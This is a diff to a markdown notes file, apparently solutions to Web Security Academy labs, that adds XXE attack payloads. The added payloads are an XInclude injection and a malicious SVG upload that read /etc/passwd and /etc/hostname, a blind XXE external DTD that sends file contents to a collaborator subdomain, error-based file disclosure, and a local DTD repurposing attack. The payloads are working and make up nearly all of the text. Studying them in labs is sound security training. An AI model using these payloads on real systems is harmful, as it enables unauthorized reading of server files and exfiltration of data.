@@ -32,6 +32,24 @@ Content-Length: 546
 }"
 ```
 
+### Exploiting XInclude to retrieve files
+Body is not XML itself but one of values is injected into XML context.. (for example SOAP)
+```
+productId=<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>&storeId=1
+```
+
+### Exploiting XXE via image file upload
+SVG file
+```
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+<text font-size="16" x="0" y="16">&xxe;</text>
+</svg> 
+```
+
+Read value from avatar image
+
 ## Blind XXE vulnerabilities
 
 ### Blind XXE with out-of-band interaction
@@ -44,4 +62,57 @@ Content-Length: 546
 ```xml
 <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://burpcollaborator.net"> %xxe; ]> 
 <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+```
+
+### Exploiting blind XXE to exfiltrate data using a malicious external DTD
+TODO: Burp Suite Professional
+
+Exploit hosted at https://ac951f351fa00e4680194cf5014e0008.web-security-academy.net/exploit
+```
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/?x=%file;'>">
+%eval;
+%exfiltrate; 
+```
+
+Modified HTTP request body
+```
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://ac951f351fa00e4680194cf5014e0008.web-security-academy.net/exploit"> %xxe;]>
+```
+
+### Exploiting blind XXE to retrieve data via error messages
+Exploit hosted at https://ac381fd11f83c251800a4f4901dc00aa.web-security-academy.net/
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+
+Modified HTTP request body
+```
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://ac381fd11f83c251800a4f4901dc00aa.web-security-academy.net/exploit"> %xxe;]>
+```
+
+### Exploiting XXE to retrieve data by repurposing a local DTD
+Verify the file exists
+```
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+%local_dtd;
+]>
+```
+
+Modified HTTP request body
+```
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]> 
 ```
